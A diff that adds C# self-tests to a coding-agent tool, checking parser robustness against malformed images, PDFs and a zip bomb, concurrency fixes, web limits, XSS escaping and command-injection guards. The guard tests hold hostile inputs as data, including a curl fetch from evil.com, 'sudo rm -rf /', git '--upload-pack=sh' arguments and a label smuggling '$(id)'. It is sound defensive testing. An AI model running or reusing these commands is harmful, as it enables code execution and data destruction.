@@ -1,3 +1,4 @@
+using System.IO.Compression;
 using System.Text;
 using System.Text.Json;
 using WayCoder.Infra;
@@ -801,6 +802,152 @@ public static partial class SelfTest
         Check("SSRF: 308 是重定向", SsgfGuard.IsRedirect(308));
         Check("SSRF: 200 非重定向", !SsgfGuard.IsRedirect(200));
         Check("SSRF: 404 非重定向", !SsgfGuard.IsRedirect(404));
+    }
+
+    /// <summary>P1 批次：崩溃/健壮性加固（递归深度、死循环、不可信尺寸字段 OOM 防护）测试。</summary>
+    private static void TestP1Hardening(Action<string, bool> Check)
+    {
+        // ── P1-1 PDF 深层嵌套字典/数组防栈溢出（护栏 128 层）──
+        var deepPdf = BuildNestedPdf(10000);
+        var deepParser = PdfParser.Open(deepPdf);
+        Check("Pdf: 万级嵌套数组不栈溢出（返回解析器）", deepParser != null);
+
+        // ── P1-2 PNG 负数 chunk 长度防死循环 ──
+        var pngNeg = new byte[16];
+        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngNeg, 0);
+        pngNeg[8] = 0x80; // len = 0x80000000（BE32 读作负数）
+        bool pngNegThrew = false;
+        try { PngDecoder.Decode(pngNeg); } catch (FormatException) { pngNegThrew = true; }
+        Check("Png: 负数 chunk 长度报错（不死循环）", pngNegThrew);
+
+        // ── P1-2 DrawCanvas 圆/椭圆 NaN/Inf/超大半径防死循环 ──
+        bool fillOk = true;
+        try
+        {
+            var c1 = new Canvas(100, 100, 0xFFFFFFFF);
+            c1.FillCircle(50, 50, double.NaN, 0xFF000000);
+            c1.FillCircle(50, 50, 1e300, 0xFF000000);
+            var c2 = new Canvas(100, 100, 0xFFFFFFFF);
+            c2.FillEllipse(50, 50, double.PositiveInfinity, 5, 0xFF000000);
+            c2.FillEllipse(50, 50, 5, double.NegativeInfinity, 0xFF000000);
+            c2.FillEllipse(50, 50, 0, 5, 0xFF000000);
+        }
+        catch { fillOk = false; }
+        Check("Draw: 圆/椭圆 NaN/Inf/超大半径不崩", fillOk);
+
+        // ── P1-3 PNG 超大尺寸防 OOM ──
+        var pngBig = new byte[33];
+        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngBig, 0);
+        pngBig[11] = 13; // IHDR 长度
+        Encoding.ASCII.GetBytes("IHDR").CopyTo(pngBig, 12);
+        pngBig[18] = 0xFF; pngBig[19] = 0xFF; // width = 65535
+        pngBig[22] = 0xFF; pngBig[23] = 0xFF; // height = 65535
+        pngBig[24] = 8; pngBig[25] = 6; // bitDepth=8, colorType=RGBA
+        bool pngBigThrew = false;
+        try { PngDecoder.Decode(pngBig); } catch (FormatException) { pngBigThrew = true; }
+        Check("Png: 超大尺寸报错（防 OOM）", pngBigThrew);
+
+        // ── P1-3 BMP 超大尺寸防 OOM ──
+        var bmpBig = new byte[54];
+        bmpBig[0] = (byte)'B'; bmpBig[1] = (byte)'M';
+        W32(bmpBig, 10, 54);      // dataOffset
+        W32(bmpBig, 14, 40);      // dibSize
+        W32(bmpBig, 18, 65535);   // width
+        W32(bmpBig, 22, 65535);   // height
+        W16(bmpBig, 28, 24);      // bpp
+        W32(bmpBig, 30, 0);       // BI_RGB
+        bool bmpBigThrew = false;
+        try { BmpCodec.Decode(bmpBig); } catch (FormatException) { bmpBigThrew = true; }
+        Check("Bmp: 超大尺寸报错（防 OOM）", bmpBigThrew);
+
+        // ── P1-3 JPEG 超大尺寸 / 非法分量数 / 非法采样因子 ──
+        var jpegBig = new byte[]
+        {
+            0xFF, 0xD8,                       // SOI
+            0xFF, 0xC0, 0x00, 0x0B, 8,       // SOF0: len=11, precision=8
+            0xFF, 0xFF, 0xFF, 0xFF,          // height=65535, width=65535
+            1, 1, 0x11, 0,                   // nComp=1, comp[0] id=1 hv=0x11 qid=0
+            0xFF, 0xDA, 0x00, 0x08, 1,       // SOS: len=8, n=1
+            1, 0x00, 0, 0x3F, 0,             // comp id=1 hf=0, Ss=0 Se=63 AhAl=0
+            0x00, 0x00, 0xFF, 0xD9,          // 熵数据 + EOI
+        };
+        bool jpegBigThrew = false;
+        try { JpegCodec.Decode(jpegBig); } catch (FormatException) { jpegBigThrew = true; }
+        Check("Jpeg: 超大尺寸报错（防 OOM）", jpegBigThrew);
+
+        // 非法分量数 nComp=5
+        var jpegNComp = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x17, 8, 0, 16, 0, 16, 5 };
+        for (int i = 0; i < 5; i++) { jpegNComp.Add(1); jpegNComp.Add(0x11); jpegNComp.Add(0); }
+        bool jpegNCompThrew = false;
+        try { JpegCodec.Decode(jpegNComp.ToArray()); } catch (FormatException) { jpegNCompThrew = true; }
+        Check("Jpeg: 非法分量数报错", jpegNCompThrew);
+
+        // 非法采样因子 hv=0x05（hh=0）
+        var jpegHv = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x0B, 8, 0, 16, 0, 16, 1, 1, 0x05, 0 };
+        bool jpegHvThrew = false;
+        try { JpegCodec.Decode(jpegHv.ToArray()); } catch (FormatException) { jpegHvThrew = true; }
+        Check("Jpeg: 非法采样因子报错", jpegHvThrew);
+
+        // ── P1-3 DrawEngine 超大画布防 OOM ──
+        var bigCanvas = DrawRunner.Parse("canvas 100000 100000\nrect 0 0 10 10");
+        Check("Draw: 超大画布报错", bigCanvas.Error != null);
+        Check("Draw: 超大画布保留默认尺寸", bigCanvas.Width == 800 && bigCanvas.Height == 600);
+
+        // ── P1-3 CFB 超大 Size 字段钳制到文件大小 ──
+        var cfbHuge = BuildCfb(("S", Encoding.ASCII.GetBytes("hi")));
+        W64(cfbHuge, 1024 + 128 + 120, 0xFFFFFFFFUL); // 目录扇区 1 → offset 1024，流条目 di=1 → +128，size 字段 +120
+        var hugeDoc = CfbParser.Open(cfbHuge);
+        Check("Wps: 超大 Size 字段仍可解析", hugeDoc != null);
+        var hugeStream = hugeDoc?.GetStream("S");
+        Check("Wps: 超大 Size 流长度被钳制", hugeStream != null && hugeStream.Length <= cfbHuge.Length);
+
+        // ── P1-3 Office zip bomb 防 OOM ──
+        var bombPath = Path.Combine(Path.GetTempPath(), "wc_bomb_" + Guid.NewGuid().ToString("N")[..6] + ".docx");
+        try
+        {
+            using (var fs = File.Create(bombPath))
+            using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
+            {
+                var entry = zip.CreateEntry("word/document.xml");
+                using var es = entry.Open();
+                var chunk = new byte[1024 * 1024];
+                Array.Fill(chunk, (byte)'A');
+                for (int i = 0; i < 65; i++) es.Write(chunk, 0, chunk.Length); // 65MB 高度可压缩
+            }
+            var bombResult = OfficeExtractor.ExtractDocx(bombPath);
+            Check("Office: zip bomb 报错不 OOM", bombResult.Contains("错误") || bombResult.Contains("zip bomb"));
+        }
+        finally { try { File.Delete(bombPath); } catch { } }
+    }
+
+    /// <summary>构造带深度嵌套数组（depth 层）的最小 PDF，用于验证解析器防栈溢出护栏。</summary>
+    private static byte[] BuildNestedPdf(int depth)
+    {
+        var bytes = new List<byte>();
+        void Add(string s) => bytes.AddRange(Encoding.ASCII.GetBytes(s));
+
+        Add("%PDF-1.4\n");
+        var offsets = new long[4];
+        offsets[1] = bytes.Count;
+        Add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+        offsets[2] = bytes.Count;
+        Add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+        offsets[3] = bytes.Count;
+        Add("3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n");
+
+        var xrefPos = bytes.Count;
+        Add("xref\n0 4\n");
+        Add("0000000000 65535 f \n");
+        for (int i = 1; i <= 3; i++)
+            Add($"{offsets[i]:D10} 00000 n \n");
+
+        Add("trailer\n<< /Size 4 /Root 1 0 R /Deep ");
+        Add(new string('[', depth));
+        Add("1");
+        Add(new string(']', depth));
+        Add(" >>\nstartxref\n" + xrefPos + "\n%%EOF\n");
+
+        return bytes.ToArray();
     }
 
     private static void TestBatchEngine(Action<string, bool> Check)
@@ -1668,6 +1815,129 @@ public static partial class SelfTest
         FileLockManager.ReleaseAll(agentB);
     }
 
+    /// <summary>P3 并发竞态修复验证：ModelOverride 恢复 / 线程安全集合 / 后台任务输出 / LRU 回调重入 / 文件锁并发 / LLM 重试。</summary>
+    private static void TestP3Concurrency(Action<string, bool> Check)
+    {
+        // ── 1. WithModelOverrideAsync：异常不污染 ModelOverride ──
+        var mLLM = new LLM("big-model", "k");
+        mLLM.SmallModel = "small-model";
+        mLLM.ModelOverride = null;
+        var mr = Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
+        {
+            await Task.CompletedTask;
+            return "done";
+        }).GetAwaiter().GetResult();
+        Check("P3: WithModelOverride 成功返回", mr == "done");
+        Check("P3: WithModelOverride 成功后恢复", mLLM.ModelOverride == null);
+
+        mLLM.ModelOverride = "orig";
+        try
+        {
+            Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
+            {
+                await Task.CompletedTask;
+                throw new InvalidOperationException("boom");
+            }).GetAwaiter().GetResult();
+        }
+        catch (InvalidOperationException) { }
+        Check("P3: WithModelOverride 异常后恢复", mLLM.ModelOverride == "orig");
+
+        // ── 2. ThreadSafeStringSet：并发 Add 去重 + 快照枚举 ──
+        var tss = new ThreadSafeStringSet();
+        System.Threading.Tasks.Parallel.For(0, 1000, i => tss.Add("file" + (i % 50)));
+        Check("P3: ThreadSafeStringSet 并发去重计数", tss.Count == 50);
+        var snap = tss.ToList();
+        Check("P3: ThreadSafeStringSet 快照", snap.Count == 50);
+        Check("P3: ThreadSafeStringSet 包含", tss.Contains("file0") && tss.Contains("file49"));
+
+        // ── 3. BackgroundTask：并发追加输出不丢更新 ──
+        var bt = new BackgroundTaskManager.BgTask(1, "echo", DateTime.Now);
+        var segs = Enumerable.Range(0, 200).Select(i => $"#{i}#").ToArray();
+        System.Threading.Tasks.Parallel.For(0, 200, i => bt.AppendOutput(segs[i]));
+        Check("P3: BackgroundTask 并发追加无丢失", segs.All(s => bt.Output.Contains(s)));
+
+        // ── 4. LruCache：OnEvicted 回调内重入不死锁（回调须在锁外触发）──
+        bool reentrantOk = true;
+        try
+        {
+            var rc = new LruCache<string, int>(2);
+            rc.OnEvicted += (k, _) => { if (k == "a") rc.Put("z", 99); };
+            rc.Put("a", 1);
+            rc.Put("b", 2);
+            rc.Put("c", 3); // 淘汰 a → 回调内 Put("z", 99) 重入
+            reentrantOk = rc.Get("z") == 99;
+        }
+        catch { reentrantOk = false; }
+        Check("P3: LruCache OnEvicted 回调重入不死锁", reentrantOk);
+
+        // ── 5. FileLockManager：并发抢锁互斥 + 同 agent 续期 ──
+        var racePath = Path.Combine(Path.GetTempPath(), "wc_race_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
+        int winners = 0;
+        System.Threading.Tasks.Parallel.For(0, 32, i =>
+        {
+            if (FileLockManager.TryAcquire(racePath, $"race-{i}", TimeSpan.FromSeconds(30)))
+                System.Threading.Interlocked.Increment(ref winners);
+        });
+        Check("P3: FileLock 并发抢锁仅 1 成功", winners == 1);
+
+        // 释放抢锁赢家，避免残留锁污染后续测试的锁列表断言
+        var holder = FileLockManager.GetLockInfo(racePath)?.AgentId;
+        if (holder != null) FileLockManager.Release(racePath, holder);
+        Check("P3: FileLock 抢锁赢家已释放", FileLockManager.GetLockInfo(racePath) == null);
+
+        // 同 agent 并发续期：全部成功（续期幂等，不丢锁）
+        Check("P3: FileLock renewer 首获成功", FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)));
+        int renewOk = 0;
+        System.Threading.Tasks.Parallel.For(0, 32, i =>
+        {
+            if (FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)))
+                System.Threading.Interlocked.Increment(ref renewOk);
+        });
+        Check("P3: FileLock 同 agent 并发续期全部成功", renewOk == 32);
+        FileLockManager.Release(racePath, "renewer");
+
+        // ── 6. LLM 5xx 重试（响应释放 + 重试成功）──
+        var retryServer = new WayCoder.Web.HttpServer(0);
+        int attempts = 0;
+        retryServer.OnRequest = _ =>
+        {
+            int n = System.Threading.Interlocked.Increment(ref attempts);
+            if (n < 3)
+                return new WayCoder.Web.HttpResponse { Status = 500, Reason = "Internal Server Error", Body = Encoding.UTF8.GetBytes("server error") };
+            var sse = "data: {\"choices\":[{\"delta\":{\"content\":\"hello\"}}]}\n\n" +
+                      "data: {\"choices\":[{\"delta\":{\"content\":\"world\"}}]}\n\n" +
+                      "data: [DONE]\n\n";
+            return WayCoder.Web.HttpResponse.JsonBody(sse);
+        };
+        retryServer.Start();
+        try
+        {
+            var retryLlm = new LLM("test-model", "test-key", $"http://127.0.0.1:{retryServer.ActualPort}");
+            var r = retryLlm.ChatAsync(new List<JNode> { JNode.Object().Set("role", "user").Set("content", "hi") }).GetAwaiter().GetResult();
+            Check("P3: LLM 5xx 重试后成功", r.Content.Contains("hello"));
+            Check("P3: LLM 重试发起 ≥3 次请求", attempts >= 3);
+        }
+        catch (Exception ex)
+        {
+            DebugLog.Log("selftest", "LLM retry test: " + ex);
+            Check("P3: LLM 5xx 重试后成功", false);
+        }
+        finally { retryServer.Stop(); }
+    }
+
+    /// <summary>跨平台运行器选择（CrossPlatform）单元测试：shell/python 可执行文件与参数标志。</summary>
+    private static void TestCrossPlatform(Action<string, bool> Check)
+    {
+        Check("XPlat: IsWindows 与系统一致", CrossPlatform.IsWindows == OperatingSystem.IsWindows());
+        Check("XPlat: ShellExecutable 合法", CrossPlatform.ShellExecutable is "cmd.exe" or "/bin/bash");
+        Check("XPlat: PythonExecutable 合法", CrossPlatform.PythonExecutable is "python" or "python3");
+        Check("XPlat: ShellArgs 用对标志",
+            CrossPlatform.ShellArgs("echo hi").StartsWith(CrossPlatform.IsWindows ? "/c" : "-c"));
+        // Unix 分支需对内层引号转义（bash -c 语义），Windows 分支无需转义
+        if (!CrossPlatform.IsWindows)
+            Check("XPlat: Unix ShellArgs 转义内层引号", CrossPlatform.ShellArgs("echo \"hi\"").Contains("\\\""));
+    }
+
     /// <summary>文件追踪器（FileTracker）单元测试：stale-read 检测 + 先读后改保护 + 删除/禁用。</summary>
     private static void TestFileTracker(Action<string, bool> Check)
     {
@@ -2381,6 +2651,57 @@ public static partial class SelfTest
         finally { web.Stop(); }
     }
 
+    /// <summary>P4-2 Web 资源耗尽防护 + XSS：请求正文大小上限/连接上限/SSE+输入队列上限/HtmlEscape。</summary>
+    private static void TestP4WebResource(Action<string, bool> Check)
+    {
+        // ── 1. 请求正文大小上限（纯逻辑）──
+        Check("WebRes: 上限内不拒绝", !WayCoder.Web.HttpServer.IsRequestTooLarge(WayCoder.Web.HttpServer.MaxRequestBytes));
+        Check("WebRes: 超上限拒绝", WayCoder.Web.HttpServer.IsRequestTooLarge(WayCoder.Web.HttpServer.MaxRequestBytes + 1));
+
+        // ── 2. 超大 Content-Length → 413（端到端，服务端读完头立即拒绝不等待正文）──
+        var bigServer = new WayCoder.Web.HttpServer(0);
+        bigServer.OnRequest = req => req.Path == "/chat" ? WayCoder.Web.HttpResponse.Text("ok") : null;
+        bigServer.Start();
+        try
+        {
+            using var tcp = new System.Net.Sockets.TcpClient();
+            tcp.Connect("127.0.0.1", bigServer.ActualPort);
+            var raw = "POST /chat HTTP/1.1\r\nHost: localhost\r\nContent-Length: 999999999\r\n\r\n";
+            tcp.GetStream().Write(Encoding.UTF8.GetBytes(raw));
+            var buf = new byte[4096];
+            int rn = tcp.GetStream().Read(buf, 0, buf.Length);
+            var resp = Encoding.UTF8.GetString(buf, 0, rn);
+            Check("WebRes: 超大 Content-Length 返回 413", resp.StartsWith("HTTP/1.1 413"));
+        }
+        catch { Check("WebRes: 超大 Content-Length 返回 413", false); }
+        finally { bigServer.Stop(); }
+
+        // ── 3. 连接槽位上限（SemaphoreSlim 机制）──
+        var capServer = new WayCoder.Web.HttpServer(0);
+        int got = 0;
+        for (int i = 0; i < WayCoder.Web.HttpServer.MaxConnections; i++)
+            if (capServer.TryAcquireConnectionSlot()) got++;
+        Check("WebRes: 连接槽位全部可获取", got == WayCoder.Web.HttpServer.MaxConnections);
+        Check("WebRes: 连接槽位满后拒绝", !capServer.TryAcquireConnectionSlot());
+        capServer.ReleaseConnectionSlot();
+        Check("WebRes: 释放后可再获取", capServer.TryAcquireConnectionSlot());
+        // 清理占用的槽位（不留满槽位状态）
+        for (int i = 0; i < WayCoder.Web.HttpServer.MaxConnections; i++) capServer.ReleaseConnectionSlot();
+
+        // ── 4. SSE 客户端 / 输入队列上限（纯逻辑）──
+        Check("WebRes: SSE 未满", !WayCoder.Web.WebChatServer.SseClientsFull(WayCoder.Web.WebChatServer.MaxSseClients - 1));
+        Check("WebRes: SSE 满", WayCoder.Web.WebChatServer.SseClientsFull(WayCoder.Web.WebChatServer.MaxSseClients));
+        Check("WebRes: 输入队列未满", !WayCoder.Web.WebChatServer.InputQueueFull(WayCoder.Web.WebChatServer.MaxPendingInput - 1));
+        Check("WebRes: 输入队列满", WayCoder.Web.WebChatServer.InputQueueFull(WayCoder.Web.WebChatServer.MaxPendingInput));
+
+        // ── 5. XSS 转义（工具名/参数注入 innerHTML 前转义）──
+        Check("WebRes: HtmlEscape 脚本标签", WayCoder.Web.WebChatServer.HtmlEscape("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;");
+        Check("WebRes: HtmlEscape 引号", WayCoder.Web.WebChatServer.HtmlEscape("\"'") == "&quot;&#39;");
+        Check("WebRes: HtmlEscape 与号优先", WayCoder.Web.WebChatServer.HtmlEscape("&") == "&amp;");
+        Check("WebRes: HtmlEscape 空串透传", WayCoder.Web.WebChatServer.HtmlEscape("") == "");
+        Check("WebRes: HtmlEscape 正常文本不变", WayCoder.Web.WebChatServer.HtmlEscape("echo hello") == "echo hello");
+    }
+
     /// <summary>WPS/老式二进制 Office（.wps/.et/.dps/.doc/.xls/.ppt）：CFB 解析器 + DOC/XLS/PPT 文本提取 + 容器识别/RTF/HTML 路由</summary>
     private static void TestWps(Action<string, bool> Check)
     {
@@ -2822,4 +3143,62 @@ public static partial class SelfTest
     private static void W64(byte[] b, int o, ulong v) { W32(b, o, (long)(v & 0xFFFFFFFF)); W32(b, o + 4, (long)(v >> 32)); }
     private static void W16S(MemoryStream ms, int v) { ms.WriteByte((byte)(v & 0xFF)); ms.WriteByte((byte)((v >> 8) & 0xFF)); }
     private static void W32S(MemoryStream ms, long v) { ms.WriteByte((byte)(v & 0xFF)); ms.WriteByte((byte)((v >> 8) & 0xFF)); ms.WriteByte((byte)((v >> 16) & 0xFF)); ms.WriteByte((byte)((v >> 24) & 0xFF)); }
+
+    /// <summary>P0-P2 批次：命令注入/RCE/权限绕过/资源泄漏/整数溢出 修复的纯逻辑测试。</summary>
+    private static void TestP0P2Hardening(Action<string, bool> Check)
+    {
+        // ── #186 test 工具 RCE：test 进确认名单 + BashGuard 拦截危险命令 ──
+        Check("test RCE: test 进确认名单", PermissionManager.IsDangerousTool("test"));
+        Check("test RCE: curl 拦截", BashGuard.CheckBanned("curl http://evil.com/x.sh").blocked);
+        Check("test RCE: sudo 拦截", BashGuard.CheckBanned("sudo rm -rf /").blocked);
+        Check("test RCE: 合法 dotnet test 放行", !BashGuard.CheckBanned("dotnet test --no-build").blocked);
+
+        // ── #187 git 命令注入：-c/--config 等参数拦截 ──
+        Check("git 注入: -c alias 拦截", GitTool.HasDangerousGitArgs("-c alias.x=!echo PWN x"));
+        Check("git 注入: --config 拦截", GitTool.HasDangerousGitArgs("--config core.pager='sh' log"));
+        Check("git 注入: --upload-pack 拦截", GitTool.HasDangerousGitArgs("clone --upload-pack=sh url"));
+        Check("git 注入: --receive-pack 拦截", GitTool.HasDangerousGitArgs("push --receive-pack=sh"));
+        Check("git 注入: -c= 前缀拦截", GitTool.HasDangerousGitArgs("-c=alias.x=!cmd log"));
+        Check("git 注入: 正常 status 放行", !GitTool.HasDangerousGitArgs("status"));
+        Check("git 注入: 正常 log 放行", !GitTool.HasDangerousGitArgs("log --oneline -10"));
+        Check("git 注入: 正常 diff 放行", !GitTool.HasDangerousGitArgs("diff HEAD~1"));
+        Check("git 注入: 含 config 字样但非参数放行", !GitTool.HasDangerousGitArgs("log -- config.txt"));
+
+        // ── #188 CheckpointManager 命令注入：description 清洗 ──
+        var dirty = "x\"; rm -rf ~; $(id) `pwd` &";
+        var clean = CheckpointManager.SanitizeCheckpointLabel(dirty);
+        Check("checkpoint: 引号/分号/命令替换被清除",
+            !clean.Contains('"') && !clean.Contains(';') && !clean.Contains('$')
+            && !clean.Contains('`') && !clean.Contains('&') && !clean.Contains('\\'));
+        Check("checkpoint: 管道/重定向清除",
+            !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('|')
+            && !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('>'));
+        Check("checkpoint: 正常文本保留", CheckpointManager.SanitizeCheckpointLabel("修复登录 bug") == "修复登录 bug");
+        Check("checkpoint: 空串返回空", CheckpointManager.SanitizeCheckpointLabel("") == "");
+        Check("checkpoint: null 返回空", CheckpointManager.SanitizeCheckpointLabel(null!) == "");
+
+        // ── #189 cp/mv/find_replace 权限绕过：进确认名单 ──
+        Check("权限: cp 进确认名单", PermissionManager.IsDangerousTool("cp"));
+        Check("权限: mv 进确认名单", PermissionManager.IsDangerousTool("mv"));
+        Check("权限: find_replace 进确认名单", PermissionManager.IsDangerousTool("find_replace"));
+        Check("权限: rm 仍在名单", PermissionManager.IsDangerousTool("rm"));
+        Check("权限: 只读工具不在名单",
+            !PermissionManager.IsDangerousTool("read_file") && !PermissionManager.IsDangerousTool("glob"));
+
+        // ── #194 RasterImage 整数溢出：宽高乘积 long 检查 ──
+        bool rasterOverflow = false;
+        try { _ = new RasterImage(100000, 100000, new byte[1]); }
+        catch (ArgumentException) { rasterOverflow = true; }
+        Check("Raster: 超大宽高溢出防护", rasterOverflow);
+        bool rasterOk = true;
+        try { _ = new RasterImage(2, 2, new byte[16]); } catch { rasterOk = false; }
+        Check("Raster: 正常构造不抛", rasterOk);
+
+        // ── #194 AnsiString 越界：悬空 ESC 序列不越界 ──
+        bool ansiOk = true;
+        try { _ = AnsiString.TruncateByWidth("\x1b[", 5); } catch { ansiOk = false; }
+        Check("Ansi: 悬空 ESC 序列不越界", ansiOk);
+        var ansiRes = AnsiString.TruncateByWidth("\x1b[31mhello world", 5);
+        Check("Ansi: 正常截断保留文本", ansiRes.Contains("hello"));
+    }
 }
